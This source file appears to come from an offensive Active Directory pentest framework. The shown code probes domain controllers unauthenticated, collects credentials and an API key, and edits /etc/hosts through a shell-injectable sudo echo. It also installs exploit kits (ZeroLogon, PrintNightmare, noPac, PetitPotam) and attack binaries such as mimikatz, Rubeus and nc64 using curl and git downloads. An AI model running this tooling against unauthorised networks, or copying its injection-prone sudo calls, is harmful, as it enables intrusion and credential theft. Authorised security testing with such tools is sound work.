            log(f'{RED}All sync methods failed{RESET}', 'error')
            log('Re-enabling NTP...', 'info')
            _sudo_run('sudo timedatectl set-ntp true')
            log(f'Set skew manually: {C0}clockskew{RESET} → set', 'info')
            log(f'{GREY}Manual: sudo timedatectl set-ntp false && sudo date -s "$(date -u)"{RESET}', 'info')
    hr()

def _autodiscover(target):
    """Auto-discover domain, FQDN, OS, forest, clock skew from DC IP."""
    import re as _re_ad, subprocess as _sp_ad, shutil as _sh_ad
    if not target.dc: return

    hr()
    log(f'{C0}Auto-discovery{RESET} — probing {WHITE}{target.dc}{RESET}...','info')
    print()

    def _probe(label, fn):
        try:
            result = fn()
            if result:
                log(f'{label:<22} {GREEN}✓{RESET}  {WHITE}{result}{RESET}','info')
                return result
        except Exception as e:
            _logfile(f'autodiscover {label}: {e}')
        log(f'{label:<22} {GREY}—{RESET}','info')
        return None

    # ── 1. LDAP reachability + rootDSE ───────────────────────────────────────
    def _ldap_rootdse():
        if not _sh_ad.which('ldapsearch'): return None
        out = subprocess.check_output(
            ['ldapsearch','-x','-H',f'ldap://{target.dc}',
             '-s','base','-b','',
             'defaultNamingContext','rootDomainNamingContext',
             'dnsHostName','ldapServiceName','forestFunctionality'],
            text=True, stderr=subprocess.DEVNULL, timeout=6)
        # domain
        if not target.domain:
            m = re.search(r'defaultNamingContext:\s*(DC=.+)', out, re.I)
            if m:
                target.domain = m.group(1).replace('DC=','').replace(',','.').lower()
        # fqdn
        if not target.dc_fqdn:
            m = re.search(r'dnsHostName:\s*(\S+)', out, re.I)
            if m: target.dc_fqdn = m.group(1).strip().lower()
        # forest
        m = re.search(r'rootDomainNamingContext:\s*(DC=.+)', out, re.I)
        forest = m.group(1).replace('DC=','').replace(',','.').lower() if m else ''
        # forest functional level
        m2 = re.search(r'forestFunctionality:\s*(\d+)', out, re.I)
        fl_map = {'0':'2000','1':'2003','2':'2003R2','3':'2008','4':'2008R2',
                  '5':'2012','6':'2012R2','7':'2016','8':'2019','9':'2022'}
        fl = fl_map.get(m2.group(1),'?') if m2 else '?'
        return f'domain={target.domain} fqdn={target.dc_fqdn} forest={forest} FL={fl}'

    ldap_result = _probe('LDAP rootDSE', _ldap_rootdse)

    # ── 2. SMB banner (OS + hostname fallback) ────────────────────────────────
    def _smb_banner():
        nxc = check_tool('netexec','nxc')
        if not nxc: return None
        out = subprocess.check_output(
            [nxc,'smb',target.dc,'-u','','-p',''],
            text=True, stderr=subprocess.DEVNULL, timeout=8)
        m_os   = re.search(r'Windows[^\)]+', out)
        m_name = re.search(r'name:([A-Z0-9_-]+)', out, re.I)
        m_sign = re.search(r'signing:(True|False)', out, re.I)
        m_smb1 = re.search(r'SMBv1:(True|False)', out, re.I)
        # fallback domain/fqdn from SMB
        if not target.domain:
            m_dom = re.search(r'domain:([A-Z0-9._-]+)', out, re.I)
            if m_dom: target.domain = m_dom.group(1).lower()
        if not target.dc_fqdn and m_name and target.domain:
            target.dc_fqdn = f'{m_name.group(1)}.{target.domain}'.lower()
        os_str    = m_os.group(0).strip() if m_os else '?'
        sign_str  = f'signing={m_sign.group(1)}' if m_sign else ''
        smb1_str  = f'SMBv1={m_smb1.group(1)}' if m_smb1 else ''
        return ' · '.join(filter(None,[os_str,sign_str,smb1_str]))

    _probe('SMB banner', _smb_banner)

    # ── 3. DNS reverse lookup ─────────────────────────────────────────────────
    def _reverse_dns():
        if not _sh_ad.which('dig') and not _sh_ad.which('nslookup'): return None
        if _sh_ad.which('dig'):
            out = subprocess.check_output(['dig','+short','-x',target.dc],
                text=True, stderr=subprocess.DEVNULL, timeout=5)
            fqdn = out.strip().splitlines()[0].rstrip('.') if out.strip() else ''
        else:
            out = subprocess.check_output(['nslookup',target.dc],
                text=True, stderr=subprocess.DEVNULL, timeout=5)
            m = re.search(r'name\s*=\s*(\S+)', out, re.I)
            fqdn = m.group(1).rstrip('.') if m else ''
        if fqdn and not target.dc_fqdn:
            target.dc_fqdn = fqdn.lower()
        return fqdn or None

    _probe('Reverse DNS', _reverse_dns)

    # ── 4. Clock skew check ───────────────────────────────────────────────────
    def _clock_skew():
        if not _sh_ad.which('nmap'): return None
        out = subprocess.check_output(
            ['nmap','-sn','-Pn','--script','clock-skew',target.dc],
            text=True, stderr=subprocess.DEVNULL, timeout=10)
        m = re.search(r'clock-skew:\s*mean\s+(-?\d+s)', out, re.I)
        if m:
            skew = m.group(1)
            target.skew = skew
            return f'{skew} offset'
        # fallback: compare ntpdate
        if _sh_ad.which('ntpdate'):
            out2 = subprocess.check_output(
                ['ntpdate','-q',target.dc],
                text=True, stderr=subprocess.DEVNULL, timeout=6)
            m2 = re.search(r'offset\s+([+-]?\d+\.\d+)', out2, re.I)
            if m2:
                skew_s = float(m2.group(1))
                skew_str = f'{skew_s:+.1f}s'
                target.skew = skew_str
                if abs(skew_s) > 300:
                    return f'{skew_str} {ORANGE}WARNING: >5min skew — Kerberos will fail{RESET}'
                return skew_str
        return None

    _probe('Clock skew', _clock_skew)

    # ── 5. Port scan — key AD ports ───────────────────────────────────────────
    def _port_check():
        ports = {88:'Kerberos', 389:'LDAP', 445:'SMB', 5985:'WinRM', 3389:'RDP'}
        open_ports = []
        import socket as _sock
        for port, name in ports.items():
            try:
                s = _sock.create_connection((target.dc, port), timeout=1)
                s.close()
                open_ports.append(f'{port}/{name}')
            except Exception: pass
        return '  '.join(open_ports) if open_ports else None

    _probe('Open ports', _port_check)

    # ── 6. DNS SRV — find other DCs ──────────────────────────────────────────
    def _dns_srv():
        if not _sh_ad.which('dig') or not target.domain: return None
        out = subprocess.check_output(
            ['dig','+short','SRV',f'_ldap._tcp.dc._msdcs.{target.domain}'],
            text=True, stderr=subprocess.DEVNULL, timeout=5)
        hosts = [l.split()[-1].rstrip('.') for l in out.strip().splitlines() if l.strip()]
        return ', '.join(hosts[:3]) if hosts else None

    _probe('DC SRV records', _dns_srv)

    # ── 7. WinRM / ADWS check ────────────────────────────────────────────────
    def _winrm_check():
        import socket as _sock
        results = []
        for port, name in [(5985,'WinRM'), (5986,'WinRM-S'), (9389,'AD-WS')]:
            try:
                s = _sock.create_connection((target.dc, port), timeout=1)
                s.close()
                results.append(f'{name}:{port}')
            except Exception: pass
        return '  '.join(results) if results else None

    _probe('Remote mgmt', _winrm_check)

    # ── Summary ───────────────────────────────────────────────────────────────
    print()
    log(f'{GREEN}Auto-discovery complete{RESET}','success')
    if target.domain:   log(f'  domain  → {WHITE}{target.domain}{RESET}','info')
    if target.dc_fqdn:  log(f'  fqdn    → {WHITE}{target.dc_fqdn}{RESET}','info')
    if getattr(target,'skew',None):     log(f'  skew    → {WHITE}{target.skew}{RESET}','info')
    print()

    # auto-write krb5.conf now that we have the domain
    if target.domain and target.dc:
        _write_krb5(target)

    # suggest next steps
    log(f'Suggested next steps:','info')
    if not target.user:
        print(f'  {C0}→ set{RESET}  {GREY}add credentials{RESET}')
        print(f'  {C0}→ unauth{RESET}  {GREY}enumerate without creds{RESET}')
        print(f'  {C0}→ kerbrute{RESET}  {GREY}user enumeration{RESET}')
    else:
        print(f'  {C0}→ enum{RESET}  {GREY}full enumeration with creds{RESET}')
        print(f'  {C0}→ aclscan{RESET}  {GREY}instant ACL vulnerability scan{RESET}')
        print(f'  {C0}→ adrecon{RESET}  {GREY}BloodHound collection{RESET}')
    hr()


def set_target(target):
    hr()
    print(f'\n  {C0}{BOLD}set target{RESET}  {GREY}leave blank to keep · tab completes{RESET}\n')
    # read current api key from env
    _cur_key  = os.environ.get('ANTHROPIC_API_KEY','')
    _key_hint = _cur_key[:8]+'...' if _cur_key else ''
    _changed  = []

    fields = [
        ('domain   ', target.domain,   'domain.local'),
        ('dc IP    ', target.dc,        '10.10.10.1'),
        ('dc fqdn  ', target.dc_fqdn,   'dc01.domain.local  (auto-filled)'),
        ('username ', target.user,      'user'),
        ('password ', target.password,  ''),
        ('NT hash  ', target.hash,      ''),
        ('api key  ', _key_hint,        'sk-ant-...'),
    ]

    # show current state summary before prompting
    print(f'  {GREY}current:{RESET}', end='')
    parts = []
    if target.domain:   parts.append(f'{GREY}domain={WHITE}{target.domain}{RESET}')
    if target.dc:       parts.append(f'{GREY}dc={WHITE}{target.dc}{RESET}')
    if target.user:     parts.append(f'{GREY}user={GREEN}{target.user}{RESET}')
    if target.password: parts.append(f'{GREY}pass={GREEN}***{RESET}')
    if target.hash:     parts.append(f'{GREY}hash={GREEN}***{RESET}')
    print('  ' + '  '.join(parts) if parts else f'  {GREY}(not set){RESET}')
    print()

    for label, cur, example in fields:
        # color-code current value: green if set, dim if not
        if cur:
            disp = cur if 'pass' not in label and 'hash' not in label and 'api' not in label else '***'
            hint = f'{GREEN}[{disp}]{RESET} '
        else:
            hint = f'{GREY}e.g. {example}{RESET} ' if example else ''
        try:
            v = input(f'  {C0}{label}{RESET} {hint}> ').strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not v: continue

        old_val = cur
        if 'domain' in label:
            target.domain   = v
            if v != old_val: _changed.append(f'domain→{v}')
        elif 'fqdn' in label:
            target.dc_fqdn  = v
            if v != old_val: _changed.append(f'fqdn→{v}')
        elif 'dc'   in label:
            old_dc = target.dc
            if v: target.dc = v
            effective_dc = v or target.dc
            if effective_dc and (v != old_dc or not target.dc_fqdn):
                log(f'{GREY}DC set — running auto-discovery...{RESET}','info')
                _autodiscover(target)
            if v != old_dc: _changed.append(f'dc→{v}')
        elif 'user' in label:
            target.user     = v
            if v != old_val: _changed.append(f'user→{v}')
        elif 'pass' in label:
            target.password = v; target.hash = None
            _changed.append('password set')
        elif 'hash' in label:
            target.hash     = v; target.password = None
            _changed.append('hash set')
        elif 'api'  in label:
            os.environ['ANTHROPIC_API_KEY'] = v
            # save to ~/.segfault_target
            import configparser as _cp
            cfg_path = os.path.expanduser('~/.segfault_target')
            cfg = _cp.ConfigParser()
            if os.path.exists(cfg_path): cfg.read(cfg_path)
            if 'target' not in cfg: cfg['target'] = {}
            cfg['target']['anthropic_api_key'] = v
            with open(cfg_path,'w') as _f: cfg.write(_f)
            log(f'API key saved to {WHITE}~/.segfault_target{RESET}','success')

    # auto-discover domain/fqdn from DC IP if not set
    if target.dc and (not target.domain or not target.dc_fqdn):
        _autodiscover(target)

    # fallback dc_fqdn guess
    if not target.dc_fqdn and target.domain and target.dc:
        target.dc_fqdn = f'dc01.{target.domain}'
        log(f'dc fqdn guessed as {WHITE}{target.dc_fqdn}{RESET} — override with set','warn')
    hr()
    if _changed:
        log(f'{GREEN}Changed: {RESET}{GREY}{", ".join(_changed)}{RESET}','success')
    log(f'Target: {target.summary()}','success')
    # auto-write krb5.conf if we have enough info
    if target.domain and target.dc:
        _write_krb5(target)
        log(f'Run {C0}clockskew{RESET} to detect and fix Kerberos clock offset before attacking','info')
    # add DC fqdn to /etc/hosts — update existing IP entry if present, avoid duplicates
    if target.dc_fqdn and target.dc:
        try:
            lines = open('/etc/hosts', errors='replace').read().splitlines()
            full_content = '\n'.join(lines)
            if target.dc_fqdn not in full_content:
                new_lines = []
                updated = False
                for l in lines:
                    stripped = l.strip()
                    if stripped.startswith(target.dc) and not stripped.startswith('#'):
                        parts = stripped.split()
                        if target.dc_fqdn not in parts:
                            parts.insert(1, target.dc_fqdn)
                        new_lines.append(' '.join(parts))
                        updated = True
                    else:
                        new_lines.append(l)
                if updated:
                    new_content = '\n'.join(new_lines) + '\n'
                    subprocess.run(['sudo','-n','tee','/etc/hosts'],
                        input=new_content, text=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    log(f'Updated /etc/hosts: {WHITE}{target.dc}  {target.dc_fqdn}{RESET}','success')
                else:
                    entry = f'{target.dc}  {target.dc_fqdn}  {target.domain}'
                    subprocess.run(['sudo','-n','bash','-c',f'echo "{entry}" >> /etc/hosts'],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    log(f'Added {WHITE}{target.dc_fqdn}{RESET} → {WHITE}{target.dc}{RESET} to /etc/hosts','success')
            else:
                log(f'{GREY}{target.dc_fqdn} already in /etc/hosts{RESET}','info')
        except Exception: pass
    hr()

# =============================================================================
# INSTALL
# =============================================================================

# pip packages — (package_name, binary_to_check)
# impacket first — other tools depend on its version
PIP_PKGS = [
    ('impacket',      'impacket-secretsdump'),
    ('certipy-ad',    'certipy'),
    ('bloodyad',      'bloodyad'),
    ('evil-winrm',    'evil-winrm'),
    ('bloodhound',    'bloodhound-python'),
    ('ldapdomaindump','ldapdomaindump'),
    ('ldeep',         'ldeep'),
    ('adidnsdump',    'adidnsdump'),
    ('pywhisker',     'pywhisker'),
    ('pywerview',     'pywerview'),
    ('coercer',       'coercer'),
    ('ldap3',         'ldap3'),
    ('netexec',       'netexec'),
    ('abuseACL',      'abuseACL'),
    ('lsassy',        'lsassy'),
    ('autobloody',    'autobloody'),
    ('pywsus',        'pywsus'),
    ('smbclientng',   'smbclientng'),
    ('powerview',     'powerview'),
]

# apt packages — (package_name, binary_to_check)
# kerbrute is not in apt on Kali — handled via snap/go/binary separately
APT_PKGS = [
    ('enum4linux',   'enum4linux'),
    ('smbclient',    'smbclient'),
    ('ldap-utils',   'ldapsearch'),
    ('responder',    'responder'),
    ('python3-pip',  'pip3'),
    ('golang-go',    'go'),          # needed to build kerbrute from source
    ('faketime',     'faketime'),    # Kerberos clock skew fix
    # ntpdate handled separately — Kali 2024+ ships ntpsec-ntpdate instead
]

# git repos — (name, url, post_cmd, binary_to_check)
# rusthound-ce installed via cargo — handled separately in run_install
RUSTHOUND_CE = True  # flag to trigger cargo install in run_install

GIT_REPOS = [
    ('mitm6',            'https://github.com/dirkjanm/mitm6',                  'pip install . --break-system-packages', 'mitm6'),
    ('CVE-2020-1472',    'https://github.com/dirkjanm/CVE-2020-1472',           None,                                   'cve-2020-1472-exploit.py'),
    ('noPac',            'https://github.com/Ridter/noPac',                     None,                                   'noPac.py'),
    ('CVE-2021-1675',    'https://github.com/cube0x0/CVE-2021-1675',            None,                                   'CVE-2021-1675.py'),
    ('Coercer',          'https://github.com/p0dalirius/Coercer',               'pip install . --break-system-packages', 'Coercer'),
    ('PetitPotam',       'https://github.com/topotam/PetitPotam',               None,                                   'PetitPotam.py'),
    ('DFSCoerce',        'https://github.com/Wh04m1001/DFSCoerce',              None,                                   'dfscoerce.py'),
    ('printerbug',       'https://github.com/dirkjanm/krbrelayx',               None,                                   'printerbug.py'),
    ('PassTheCert',      'https://github.com/AlmondOffSec/PassTheCert',         None,                                   'passthecert.py'),
    ('PKINITtools',      'https://github.com/dirkjanm/PKINITtools',             'pip install -r requirements.txt --break-system-packages', 'gettgtpkinit.py'),
    ('pywhisker',        'https://github.com/ShutdownRepo/pywhisker',           'pip install -r requirements.txt --break-system-packages', 'pywhisker.py'),
    ('username-anarchy', 'https://github.com/urbanadventurer/username-anarchy', None,                                   'username-anarchy'),
    ('Timeroast',        'https://github.com/SecuraBV/Timeroast',               'pip install -r requirements.txt --break-system-packages 2>/dev/null; true', 'timecrack.py'),
    ('targetedKerberoast', 'https://github.com/ShutdownRepo/targetedKerberoast', None, 'targetedKerberoast.py'),
    ('krbrelayx',        'https://github.com/dirkjanm/krbrelayx',               'pip install -r requirements.txt --break-system-packages 2>/dev/null; true', 'krbrelayx.py'),
    ('gMSADumper',       'https://github.com/micahvandeusen/gMSADumper',        None, 'gMSADumper.py'),
    ('pre2k',            'https://github.com/garrettfoster13/pre2k',            'pip install -r requirements.txt --break-system-packages 2>/dev/null; true', 'pre2k.py'),
    ('AADInternals',     'https://github.com/Gerenios/AADInternals',            None, 'AADInternals.psm1'),
    ('sccmhunter',       'https://github.com/garrettfoster13/sccmhunter',       'pip install -r requirements.txt --break-system-packages 2>/dev/null; true', 'sccmhunter.py'),
    ('pxethiefy',        'https://github.com/sse-secure-systems/Active-Directory-Spotlights', None, 'pxethiefy.py'),
    ('SystemDPAPIdump',  'https://github.com/fortra/impacket',                  None, 'SystemDPAPIdump.py'),
    ('abuseACL',         'https://github.com/AetherBlack/abuseACL',             'pip install . --break-system-packages 2>/dev/null; true', 'abuseACL'),
    ('ADCSKiller',       'https://github.com/grimsec/ADCSKiller',               'pip install -r requirements.txt --break-system-packages 2>/dev/null; true', 'ADCSKiller.py'),
    ('Grouper2',         'https://github.com/l0ss/Grouper2',                    None, 'Grouper2.exe'),
    ('ACLight',          'https://github.com/cyberark/ACLight',                  None, 'ACLight2.ps1'),
]

# Windows binaries — downloaded to ~/.segfault-ad/tools/win/
WIN_BINS = [
    # shells / pivoting
    ('RunasCs.exe',          'https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip',                                          'zip'),
    ('nc64.exe',             'https://github.com/int0x33/nc.exe/raw/master/nc64.exe',                                                              'exe'),
    ('chisel.exe',           'https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz',                          'gz'),
    ('ligolo-agent.exe',     'https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip',             'zip'),
    ('socat.exe',            'https://github.com/StudioEtrange/socat-windows/raw/master/socat.exe',                                                'exe'),
    # kerberos / AD
    ('Rubeus.exe',           'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe',                                   'exe'),
    ('kerbrute.exe',         'https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe',                             'exe'),
    # credential dumping
    ('mimikatz.exe',         'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip',                         'zip'),
    # privesc / enum
    ('winPEASx64.exe',       'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe',                                       'exe'),
    ('SharpUp.exe',          'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe',                                  'exe'),
    ('Seatbelt.exe',         'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe',                                 'exe'),
    ('Snaffler.exe',         'https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe',                                           'exe'),
    ('SharpHound.exe',       'https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.1/SharpHound.exe',                                       'exe'),
    ('GodPotato-NET4.exe',   'https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe',                               'exe'),
    # PowerShell scripts
    ('PowerView.ps1',        'https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1',                                      'exe'),
    ('SharpHound.ps1',       'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1',                         'exe'),
    ('ADRecon.ps1',          'https://github.com/adrecon/ADRecon/raw/master/ADRecon.ps1',                                                          'exe'),
    # file transfer
    ('wget.exe',             'https://eternallybored.org/misc/wget/1.21.4/64/wget.exe',                                                            'exe'),
]

def _pip_installed(binary):
    """Check if a pip tool is available by its binary name."""
    return bool(check_tool(binary))

def _apt_installed(binary):
    return bool(check_tool(binary))

def _git_installed(name, binary):
    # check both PATH and tools/ dir
    if check_tool(binary): return True
    dest = os.path.join('tools', name)
    if os.path.isdir(dest):
        for root, _, files in os.walk(dest):
            if binary in files: return True
        return True
    # also check ~/.segfault-ad/tools
    dest2 = os.path.join(os.path.expanduser('~/.segfault-ad/tools'), name)
    if os.path.isdir(dest2):
        for root, _, files in os.walk(dest2):
            if binary in files: return True
        return True
    return False

def _show_plugins():
    """Show loaded plugins from ~/.segfault-ad/plugins/."""
    hr()
    plugin_files = [f for f in os.listdir(CFG.PLUGINS) if f.endswith('.py') and not f.startswith('_')] if os.path.isdir(CFG.PLUGINS) else []
    if not plugin_files:
        log(f'No plugins found in {WHITE}{CFG.PLUGINS}{RESET}','info')
        log(f'{GREY}Create a .py file in that dir with a register_plugin(modules) function or PLUGIN_MODULES list{RESET}','info')
    else:
        log(f'{GREEN}{len(plugin_files)} plugin(s) in {WHITE}{CFG.PLUGINS}{RESET}','success')
        for f in plugin_files:
            print(f'  {C0}■{RESET} {f}')
    log(f'{GREY}Example plugin:{RESET}','info')
    print(f"""  {GREY}# ~/.segfault-ad/plugins/myplugin.py
  class MyModule(Module):
      name='mymod'; description='custom module'; category='recon'
      def run(self, target): ...
  PLUGIN_MODULES = [MyModule]{RESET}""")
    hr()


def run_install():
    hr()
    log('segfault-ad dependency installer', 'info')
    log(f'{ORANGE}Installs system-wide with --break-system-packages{RESET}', 'warn')
    hr()

    pip = check_tool('pip3', 'pip')
    apt = check_tool('apt-get', 'apt')
    git = check_tool('git')

    # Pre-flight: check what's already there
    pip_status = {pkg: _pip_installed(binary) for pkg, binary in PIP_PKGS}
    apt_status = {pkg: _apt_installed(binary) for pkg, binary in APT_PKGS}
    git_status = {name: _git_installed(name, binary) for name, _, _, binary in GIT_REPOS}

    print(f'\n  {C0}{BOLD}pip packages{RESET}')
    for pkg, binary in PIP_PKGS:
        ok = pip_status[pkg]
        status = f'{GREEN}installed{RESET}' if ok else f'{GREY}missing{RESET}'
        mark   = f'{GREEN}✓{RESET}' if ok else f'{RED}✗{RESET}'
        print(f'  [{mark}] {WHITE}{pkg:<22}{RESET} {GREY}{binary:<30}{RESET} {status}')

    print(f'\n  {C0}{BOLD}apt packages{RESET}')
    for pkg, binary in APT_PKGS:
        ok = apt_status[pkg]
        status = f'{GREEN}installed{RESET}' if ok else f'{GREY}missing{RESET}'
        mark   = f'{GREEN}✓{RESET}' if ok else f'{RED}✗{RESET}'
        print(f'  [{mark}] {WHITE}{pkg:<22}{RESET} {GREY}{binary:<30}{RESET} {status}')

    print(f'\n  {C0}{BOLD}kerbrute{RESET}  {GREY}(Kali snap / go build — handled separately){RESET}')
    kb = check_tool('kerbrute')
    mark = f'{GREEN}✓{RESET}' if kb else f'{RED}✗{RESET}'
    print(f'  [{mark}] {WHITE}kerbrute{RESET}')

    print(f'\n  {C0}{BOLD}rusthound-ce{RESET}  {GREY}(cargo install rusthound-ce — BloodHound CE collector){RESET}')
    rh = check_tool('rusthound-ce','rusthound_ce')
    rh_cargo = check_tool('cargo')
    mark = f'{GREEN}✓{RESET}' if rh else f'{RED}✗{RESET}'
    print(f'  [{mark}] {WHITE}rusthound-ce{RESET}  {GREY}{"present" if rh else ("cargo available — will install" if rh_cargo else "cargo not found — install rust first")}{RESET}')
    if not rh and not rh_cargo:
        print(f'  {GREY}curl --proto "=https" --tlsv1.2 -sSf https://sh.rustup.rs | sh && source $HOME/.cargo/env{RESET}')

    print(f'\n  {C0}{BOLD}krb5.conf{RESET}  {GREY}(/etc/krb5.conf — required for Kerberos attacks){RESET}')
    krb5_ok = os.path.exists('/etc/krb5.conf') and 'default_realm' in open('/etc/krb5.conf', errors='replace').read()
    mark = f'{GREEN}✓{RESET}' if krb5_ok else f'{RED}✗{RESET}'
    print(f'  [{mark}] {WHITE}/etc/krb5.conf{RESET}  {GREY}{"configured" if krb5_ok else "missing or unconfigured"}{RESET}')

    print(f'\n  {C0}{BOLD}git repos{RESET}  {GREY}→ ./tools/{RESET}')
    for name, _, _, binary in GIT_REPOS:
        ok = git_status[name]
        status = f'{GREEN}present{RESET}' if ok else f'{GREY}missing{RESET}'
        mark   = f'{GREEN}✓{RESET}' if ok else f'{RED}✗{RESET}'
        print(f'  [{mark}] {WHITE}{name:<22}{RESET} {status}')

    # Count missing
    pip_missing  = [pkg for pkg, _ in PIP_PKGS if not pip_status[pkg]]
    apt_missing  = [pkg for pkg, _ in APT_PKGS if not apt_status[pkg]]
    git_missing  = [(n,u,p,b) for n,u,p,b in GIT_REPOS if not git_status[n]]
    krb5_missing = not krb5_ok
    rh_missing   = not check_tool('rusthound-ce','rusthound_ce')
    # check which win bins are missing
    win_dir = os.path.expanduser('~/.segfault-ad/tools/win')
    os.makedirs(win_dir, exist_ok=True)
    win_missing = [(f,u,t) for f,u,t in WIN_BINS if not os.path.exists(os.path.join(win_dir,f))]
    total = len(pip_missing) + len(apt_missing) + len(git_missing) + (1 if krb5_missing else 0) + (1 if rh_missing else 0) + len(win_missing)

    print()
    if total == 0:
        log('Everything already installed', 'success'); hr(); return

    log(f'{total} package(s) to install', 'info')
    confirm = input_field('install missing? (yes/no)', 'no')
    if confirm.lower() not in ('yes', 'y'):
        log('Cancelled', 'warn'); hr(); return

    hr()
    errors = []

    # ── apt — install one at a time so one failure doesn't block others ────
    if apt_missing:
        if apt:
            log(f'apt: installing {len(apt_missing)} package(s) one by one...', 'info')
            for pkg in apt_missing:
                log(f'apt install {WHITE}{pkg}{RESET}...', 'info')
                rc = run_cmd(['sudo', apt, 'install', '-y', pkg])
                if rc != 0:
                    errors.append(f'apt install {pkg} failed')
                    log(f'{RED}failed{RESET}: {pkg}', 'error')
                else:
                    log(f'{GREEN}ok{RESET}: {pkg}', 'success')
        else:
            log('apt not found — skipping', 'warn')
    else:
        log('apt: all packages present — skipping', 'success')

    # ── rusthound-ce via cargo ──────────────────────────────────────────────
    # source cargo env in case rust was just installed this session
    cargo_env = os.path.expanduser('~/.cargo/env')
    if os.path.exists(cargo_env):
        os.environ['PATH'] = os.path.expanduser('~/.cargo/bin') + ':' + os.environ.get('PATH','')
    cargo = check_tool('cargo')
    if cargo:
        if not check_tool('rusthound-ce','rusthound_ce'):
            log('Installing rusthound-ce via cargo (this takes a few minutes)...','info')
            env = os.environ.copy()
            env['PATH'] = os.path.expanduser('~/.cargo/bin') + ':' + env.get('PATH','')
            rc = subprocess.run([cargo,'install','rusthound-ce'], env=env).returncode
            if rc == 0:
                log(f'{GREEN}ok{RESET}: rusthound-ce','success')
                # symlink into tools/ so check_tool finds it
                rh_bin = os.path.expanduser('~/.cargo/bin/rusthound-ce')
                tools_dir = os.path.expanduser('~/.segfault-ad/tools')
                os.makedirs(tools_dir, exist_ok=True)
                link = os.path.join(tools_dir,'rusthound-ce')
                if os.path.exists(rh_bin) and not os.path.exists(link):
                    try: os.symlink(rh_bin, link)
                    except Exception: pass
            else:
                log('rusthound-ce install failed','warn')
        else:
            log(f'{GREEN}ok{RESET}: rusthound-ce present','success')
    else:
        log(f'{ORANGE}cargo not found{RESET}','warn')
        log(f'Rust just installed? Run: {WHITE}source ~/.cargo/env{RESET} then re-run install','info')

    # ── ntpdate — deprecated on Kali 2024+, try ntpsec-ntpdate fallback ─────
    if not check_tool('ntpdate') and not check_tool('ntpsec-ntpdate'):
        log('ntpdate not found — trying ntpsec-ntpdate...', 'info')
        if apt:
            rc = run_cmd(['sudo', apt, 'install', '-y', 'ntpsec-ntpdate'])
            if rc == 0:
                log(f'{GREEN}ok{RESET}: ntpsec-ntpdate (replaces ntpdate)', 'success')
            else:
                log('ntpsec-ntpdate also unavailable — clock sync will use rdate or manual set', 'warn')
    elif check_tool('ntpdate') or check_tool('ntpsec-ntpdate'):
        log(f'{GREEN}ok{RESET}: ntpdate present', 'success')

    # ── kerbrute (Kali doesn't have it in apt) ────────────────────────────
    if not check_tool('kerbrute'):
        log('kerbrute not found — trying to install...', 'info')
        snap = check_tool('snap')
        go   = check_tool('go')
        if snap:
            run_cmd(['sudo', 'snap', 'install', 'kerbrute'], label='snap install kerbrute')
        elif go:
            log('Building kerbrute from source via go...', 'info')
            os.makedirs(os.path.expanduser('~/.segfault-ad/tools'), exist_ok=True)
            kb_dir = os.path.expanduser('~/.segfault-ad/tools/kerbrute')
            if not os.path.isdir(kb_dir):
                run_cmd([git or 'git', 'clone', 'https://github.com/ropnop/kerbrute', kb_dir])
            run_cmd(['bash', '-c', f'cd {kb_dir} && go build -o kerbrute . && sudo cp kerbrute /usr/local/bin/'],
                    label='build kerbrute')
        else:
            log('Downloading kerbrute binary directly...', 'info')
            arch = 'amd64'
            url  = f'https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_{arch}'
            rc   = run_cmd(['bash', '-c',
                f'curl -sL "{url}" -o /tmp/kerbrute && chmod +x /tmp/kerbrute && sudo mv /tmp/kerbrute /usr/local/bin/kerbrute'],
                label='curl kerbrute binary')
            if rc != 0: errors.append('kerbrute install failed')

    # ── pip — install one at a time, skip already installed ──────────────
    if pip_missing:
        if pip:
            log(f'pip: installing {len(pip_missing)} package(s) one by one...', 'info')
            for pkg in pip_missing:
                log(f'pip install {WHITE}{pkg}{RESET}...', 'info')
                # pywerview needs kerberos extra
                install_pkg = f'pywerview[kerberos]' if pkg == 'pywerview' else pkg
                rc = run_cmd([pip, 'install', install_pkg, '--break-system-packages',
                              '--no-deps' if pkg == 'impacket' else '--upgrade',
                              '--quiet'])
                # retry without --no-deps if it failed
                if rc != 0 and pkg == 'impacket':
                    rc = run_cmd([pip, 'install', pkg, '--break-system-packages', '--quiet'])
                if rc != 0:
                    errors.append(f'pip install {pkg} failed')
                    log(f'{RED}failed{RESET}: {pkg}', 'error')
                else:
                    log(f'{GREEN}ok{RESET}: {pkg}', 'success')
        else:
            log('pip not found — skipping Python packages', 'warn')
    else:
        log('pip: all packages present — skipping', 'success')

    # ── git repos ─────────────────────────────────────────────────────────
    _tools_base = os.path.expanduser('~/.segfault-ad/tools')
    if git_missing:
        if git:
            os.makedirs(_tools_base, exist_ok=True)
            log(f'git: cloning {len(git_missing)} repo(s) into ~/.segfault-ad/tools/...', 'info')
            for name, url, post_cmd, _ in git_missing:
                dest = os.path.join(_tools_base, name)
                log(f'Cloning {WHITE}{name}{RESET}...', 'info')
                git_env = os.environ.copy()
                git_env['GIT_TERMINAL_PROMPT'] = '0'
                git_env['GIT_ASKPASS']         = 'echo'
                rc = run_cmd([git, 'clone', '--depth', '1',
                              '-c', 'credential.helper=',
                              '-c', 'core.askPass=',
                              url, dest], env=git_env)
                if rc != 0:
                    errors.append(f'git clone {name} failed'); continue
                if post_cmd:
                    log(f'Post-install: {WHITE}{name}{RESET}...', 'info')
